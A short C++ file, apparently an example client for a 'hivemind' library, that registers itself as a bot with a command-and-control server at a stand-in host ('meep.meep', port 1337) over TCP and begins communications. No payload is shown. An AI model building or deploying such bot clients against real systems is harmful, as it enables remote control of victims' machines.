#include "hivemind.h"

int main() {
  hivemind_lib::CC_Info cc_info{1337, "meep.meep"};

  hivemind_lib::Init();
  hivemind_lib::UseTCP();
  hivemind_lib::InitComms("meep", "1234");
  hivemind_lib::AddFunction(0);
  hivemind_lib::RegisterBot(cc_info);
  hivemind_lib::BeginComms();
  return 0;
}
